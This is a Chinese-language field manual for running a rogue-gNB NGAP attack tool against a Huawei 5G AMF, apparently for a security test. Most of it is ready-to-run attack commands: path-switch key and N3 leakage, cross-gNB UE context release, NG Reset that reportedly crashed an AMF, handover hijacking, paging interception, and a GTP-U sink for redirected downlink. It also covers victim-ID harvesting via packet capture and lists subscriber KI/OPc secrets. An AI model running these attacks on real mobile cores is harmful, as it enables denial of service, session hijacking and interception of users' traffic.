# 华为 AMF 操作手册（现场实测）

测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
合法 UERANSIM 和流氓 ngap_tester 是同一个华为 AMF 上的两个 gNB。

**华为 AMF-UE-NGAP-ID 每次注册都随机。禁止 sweep。禁止用菜单里的 CASE id。**

---

## 现场只做这些（抄这一页就够打主线）

所有命令都在**仓库根目录**跑（这个目录里同时有 `deploy/`、`config/`、`ngaptester/`）。
克隆下来可能叫 `NGtester`、`ngap_tester` 或别的，不要死记 `~/ngap_tester`。

```bash
# 先确认你在根目录：下面这个文件必须存在
ls deploy/extract-ue-ids.sh config/huawei.json
# 不在的话：  cd 到 git clone 出来的那个目录

chmod +x deploy/*.sh deploy/real-amf/*.sh
./deploy/field-check.sh   # 全绿再往下；红了先看报错，不要硬打

# 终端 A
./deploy/real-amf/run-gnb.sh
# 终端 B
./deploy/real-amf/run-ue.sh
# 终端 D（gNB+UE 保持注册）
./deploy/extract-ue-ids.sh
#   抄 amf-ngap-id = AU
#   这是问 gNB 的 ue-list，不是问 UE 的 info
#   若失败：sudo ./deploy/extract-ue-ids.sh --watch 后再重启 run-ue.sh

# 终端 C
./deploy/ngt.sh sctp-ping
./deploy/ngt.sh ng-setup
AU=<刚才抄的数字>
NGT=./deploy/ngt.sh
$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
$NGT ue-release --amf-ue-id $AU
$NGT error-indication --amf-ue-id $AU
$NGT ng-reset --targets ${AU}:1
$NGT handover-required --amf-ue-id $AU
$NGT ho-window-inject --amf-ue-id $AU --mode both
$NGT ran-config-update --listen 30
$NGT ul-ran-config-transfer --target-gnb-id 1
$NGT pdu-notify --amf-ue-id $AU
$NGT handover-notify --amf-ue-id $AU
$NGT cell-trace --amf-ue-id $AU
$NGT ul-ran-status --amf-ue-id $AU
$NGT ul-nrppa --amf-ue-id $AU
```

有 GUTI / 5G-TMSI 时再打：

```bash
$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>
$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1
$NGT chain-initue-release --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
    --victim-amf-ue-id $AU --release-target both
```

数据面另开终端：`$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152`

### 现场不要做

| 不要 | 为什么 |
|---|---|
| `./deploy/ngt.sh sweep …` | 华为 AU 随机，扫不到 |
| 菜单「Run attack CASE by id」 | CASE **写死 AU=1**，N3 写死 `172.30.200.9`（实验室网），打空/打错 |
| 菜单里对 AU 回车或打 `sweep` | 会落到 1 或扫 1–32 |
| 注册完再 `extract-ue-ids.sh 30` 空等 | InitialContextSetup 已经过了，空结果正常 |
| 用上次的 AU | UE 一重注册就作废 |
| `./run.sh`（Docker） | 那是连内部核心网的，连不上华为 |

菜单选 `7` 发主线可以，但 **AU 必须手填刚读到的数字**。`ho-window-inject` / `initial-ue` / 两条 chain / `sctp-ping` **只有 CLI 有**，菜单里没有。

---

## 0. 现场已开户参数

| 项 | 值 | 写在哪 |
|---|---|---|
| IMSI | `460081111111113` | `deploy/real-amf/real-amf.env` |
| KI | `1234567890abcde1234567890abcde12` | 同上 |
| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` | 同上（`UE1_OP_TYPE=OPC`） |
| PLMN | MCC `460` / MNC `08` | env + `config/huawei.json` |
| TAC | `1` | 同上 |
| S-NSSAI | SST `1` / SD `010101` | env 里 `0x010101`，json 里 `"010101"` |
| AMF | `14.66.2.5:38412` | 同上 |
| 本机源 IP | `13.254.241.142` | env `HOST_IP`；json `bind_ip` |
| 合法 gNB-ID | `1`（`NCI=0x000000010`） | env |
| 流氓 gNB-ID | `4660` | `huawei.json`（必须已被华为允许） |

改参数只改这两个文件，然后**重启**对应进程（脚本会重新渲染 yaml）。

---

## 1. 三个终端

都在 `ngap_tester/` 目录下。**先起合法侧，再起流氓侧。不要停 UERANSIM。**

```
终端 A  ./deploy/real-amf/run-gnb.sh      # 合法 gNB，保持开着
终端 B  ./deploy/real-amf/run-ue.sh       # 合法 UE，保持开着
终端 C  ./deploy/ngt.sh …                 # 流氓 gNB，一条命令一次关联
终端 D  ./deploy/extract-ue-ids.sh        # 读本次 AU（不要 sudo；抓包才 sudo --watch）
```

### 1.1 合法侧（若还没在跑）

```bash
# 仍在仓库根目录（能 ls 到 deploy/ 和 config/）
./deploy/real-amf/run-gnb.sh
# 终端 A 看到: NG Setup procedure is successful

./deploy/real-amf/run-ue.sh
# 终端 B 看到: Registration is successful
#              PDU Session establishment is successful
#              出现网卡 uesimtun0
```

可选：`ping -I uesimtun0 <华为给的地址>` 确认数据面。

### 1.2 流氓侧先探路

```bash
./deploy/ngt.sh sctp-ping
# 成功: SUCCESS，源 IP 应为 13.254.241.142

./deploy/ngt.sh ng-setup
# 成功: NG Setup ACCEPTED
```

`sctp-ping` timeout 时：确认 `huawei.json` 的 `bind_ip` 是 `13.254.241.142`（和 UERANSIM
同一源 IP）。华为**允许多条 SCTP**，不必停合法 gNB。仍超时就抓包看 INIT 有没有 INIT-ACK，
以及本机是否真有这张地址：`ip -4 addr | grep 13.254.241.142`。

---

## 2. 怎么拿到「这一次」的受害者标识

华为 AU 随机，**每次 UE 重新注册都会变**。打完若 UE 重注册了，必须重读。

### 办法 A（推荐）：问 gNB 的 ue-list

AU 在 **gNB** 上，不在 UE 的 `info` 里。脚本会跑：

```text
nr-cli --dump
nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
# amf-ngap-id: <这就是 AU>
```

```bash
./deploy/extract-ue-ids.sh
```

### 办法 A2：抓包（必须在注册过程中抓）

```bash
# 先开抓，再重启终端 B 的 run-ue.sh
sudo ./deploy/extract-ue-ids.sh --watch
# 或
sudo tcpdump -i any -s 0 -w /tmp/n2.pcap host 14.66.2.5 and sctp
# Ctrl-C 后
sudo ./deploy/extract-ue-ids.sh -r /tmp/n2.pcap
```

注册完再抓 20 秒，空结果是正常的。`InitialContextSetup` 里才一定有 AU。

### 办法 B：读 UERANSIM 日志

终端 A 默认日志往往不打印 AU。GUTI 看终端 B（nr-ue）。手动能跑：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

终端 B（nr-ue）搜 `GUTI` / `5G-S-TMSI` / `TMSI`，拆出：

| 字段 | 给谁 |
|---|---|
| AMF-UE-NGAP-ID | `--amf-ue-id` / `--source-amf-ue-id` |
| 5G-TMSI（8 hex） | `--tmsi` |
| AMF Set ID（10 bit） | `--amf-set-id` |
| AMF Pointer（6 bit） | `--amf-pointer` |

### 不要用

```bash
./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000   # 对华为无效
```

---

## 3. 攻击清单（仓库里能跑的全部都在这里）

`./deploy/ngt.sh` 的**每一条已实现子命令**都列在下面。华为现场只用 CLI，不要发 CASE id。

`<AU>` = **这一次**从合法 NGAP 读到的 AMF-UE-NGAP-ID。每条命令（除 sctp-ping / gtpu-sink）都会自己再做一次 NG Setup。

```bash
NGT=./deploy/ngt.sh
AU=<本次读到的数字>
```

### 3.0 全部 CLI 对照（18 条可跑 + 1 条华为不要用）

| # | 命令 | 要 AU？ | 开源上测过什么 |
|---|---|---|---|
| 1 | `sctp-ping` | 否 | L4 探路 |
| 2 | `ng-setup` | 否 | 流氓 gNB 被接受 |
| 3 | `path-switch` | 要 | 泄 {NH,NCC}，有的还泄 N3 |
| 4 | `ue-release` | 要 | 跨 gNB 释放 UE |
| 5 | `error-indication` | 要 | 跨 UE 释放 |
| 6 | `ng-reset` | 要 | Open5GS 曾崩 AMF |
| 7 | `handover-required` | 要 | 强制切换 |
| 8 | `ho-window-inject` | 要 | 自开 HO 窗 + p21/p09 |
| 9 | `ran-config-update` | 否 | 假 TAI 截寻呼 |
| 10 | `ul-ran-config-transfer` | 否（要目标 gNB-ID） | SON/Xn 盲中继 |
| 11 | `initial-ue` | 否（要 GUTI） | 用 5G-S-TMSI 开新上下文 |
| 12 | `chain-ps-release` | 要 | Path Switch 紧接着 Release |
| 13 | `chain-initue-release` | GUTI（AU 可选） | InitUE 再 Release |
| 14 | `handover-notify` | 要 | p09 |
| 15 | `pdu-notify` | 要 | p06 |
| 16 | `cell-trace` | 要 | p17 |
| 17 | `ul-ran-status` | 要 | p21 |
| 18 | `ul-nrppa` | 要 | p16 |
| 19 | `gtpu-sink` | 否 | 接被重定向的下行 |
| — | `sweep` | — | **华为 AU 随机，不要用** |

菜单里 `Handover Cancel` / `Uplink Non-UE NRPPa` 显示 TODO，现场不要点。华为也不要发 3.5 的 CASE id。

### 3.1 主线

```bash
$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
$NGT ue-release --amf-ue-id $AU
$NGT error-indication --amf-ue-id $AU
$NGT ng-reset --targets ${AU}:1
$NGT handover-required --amf-ue-id $AU
$NGT ho-window-inject --amf-ue-id $AU --mode both
$NGT ran-config-update --listen 30
$NGT ul-ran-config-transfer --target-gnb-id 1
```

### 3.2 组合链 + 单独 InitialUE

```bash
$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1

$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>

$NGT chain-initue-release \
    --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
    --victim-amf-ue-id $AU --release-target both
```

### 3.3 新 5 条报文

```bash
$NGT handover-notify --amf-ue-id $AU
$NGT pdu-notify      --amf-ue-id $AU
$NGT cell-trace      --amf-ue-id $AU
$NGT ul-ran-status   --amf-ue-id $AU
$NGT ul-nrppa        --amf-ue-id $AU
```

### 3.4 数据面接收（配合 path-switch）

```bash
$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152
```

### 3.5 CASE 目录 —— 华为现场不要用

`docs/cases/` 和菜单「Run attack CASE by id」是实验室变体。代码里 **AU 写死为 1**，
Path Switch 的 N3 写死 `172.30.200.9`。在华为上发出去等于打一个不存在的 UE。
主线请只用上面的 `$NGT … --amf-ue-id $AU`。

下面只作对照（哪些变体曾经存在），**不要在华为菜单里发这些 id**：

| id | 报文 |
|---|---|
| p01-a/b/c/d/f | PathSwitchRequest 变体 |
| p02-a/b | UEContextReleaseRequest 变体 |
| p03-a/b/d | HandoverRequired 变体 |
| p04-a | HandoverCancel（无独立 CLI） |
| p05-a/b/e/f | PDUSessionResourceModifyIndication |
| p06-a | PDUSessionResourceNotify |
| p09-a | HandoverNotify |
| p11-a | RRCInactiveTransitionReport |
| p12-a | UERadioCapabilityInfoIndication |
| p13-a | SecondaryRATDataUsageReport |
| p14-a | LocationReport |
| p15-a | LocationReportingFailureIndication |
| p16-a | Uplink UE-assoc NRPPa |
| p17-a | CellTrafficTrace |
| p19-a | RANCPRelocationIndication |
| p21-a | UplinkRANStatusTransfer |
| p22-a | UplinkRANEarlyStatusTransfer |
| g01-a/b/d | NGReset 变体 |
| g02-a | RANConfigurationUpdate |
| g03-a/b | NGSetupRequest 变体 |
| g04-a | ErrorIndication（非 UE 关联） |
| g07-a | PWSRestartIndication |
| g08-a | PWSFailureIndication |
| g09-a | UplinkRANConfigurationTransfer |
| g10-a | Uplink Non-UE NRPPa（无独立 CLI） |
| g11-a | UplinkRIMInformationTransfer |

交互菜单发主线（选 `7` Huawei AMF）也可以，和 `$NGT` 是同一套包。

```bash
.venv/bin/python -m ngaptester.menu
./deploy/ngt.sh -h
```

---

## 4. 怎么判断「打中了」

同时看四边：

1. **终端 C（ngt）**：ACK / Error Indication / 无回 / 解码出的 NH·NCC·N3
2. **终端 B（UE）**：是否还 `CM-CONNECTED`、`uesimtun0` 是否还在、ping 是否断
3. **终端 A（合法 gNB）**：是否出现 UE Context Release / Radio link failure
4. **华为 AMF 日志**（若能看）：该 IMSI 上下文是否被释放、是否切到 gNB 4660

建议每条命令加证据文件：

```bash
$NGT --evidence evidence/huawei-path-switch.jsonl path-switch --source-amf-ue-id $AU
```

---

## 5. 现场记录表（华为是新靶，开源结论不能直接套）

| 攻击 | 发出 | AMF 回复 | 受害 UE | 合法 gNB | 备注 |
|---|---|---|---|---|---|
| sctp-ping | | | — | — | 源 IP= |
| ng-setup | | Accept / Reject | — | — | |
| path-switch | | | | | NH/NCC/N3? |
| ue-release | | | | | |
| error-indication | | | | | |
| ng-reset | | | | | AMF 是否还活着 |
| handover-required | | | | | |
| ho-window-inject | | | | | |
| ran-config-update | | | | | 截到 TMSI? |
| ul-ran-config-transfer | | | | | |
| initial-ue | | | | | 用 GUTI |
| chain-ps-release | | | | | |
| chain-initue-release | | | | | |
| gtpu-sink + path-switch | | | | | 是否收到下行 |
| handover-notify | | | | | |
| pdu-notify | | | | | |
| cell-trace | | | | | |
| ul-ran-status | | | | | |
| ul-nrppa | | | | | |

---

## 6. 常见问题

| 现象 | 处理 |
|---|---|
| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP，不用停合法 gNB。查本机是否有该地址、抓包看 INIT 有无 INIT-ACK |
| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未在华为侧开通 |
| UE 认证失败 | IMSI/KI/OPc/PLMN 与开户不一致；首次 SQN re-sync 属正常 |
| 攻击「没反应」 | AU 已过期，或填成了 1 / 扫出来的假 ID。重新 `extract-ue-ids.sh` |
| `extract-ue-ids.sh` 是空的 | 注册完才抓的。先 `--watch` 再重启 UE；或直接 `./deploy/extract-ue-ids.sh` 走 nr-cli |
| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU，不要用旧数字 |
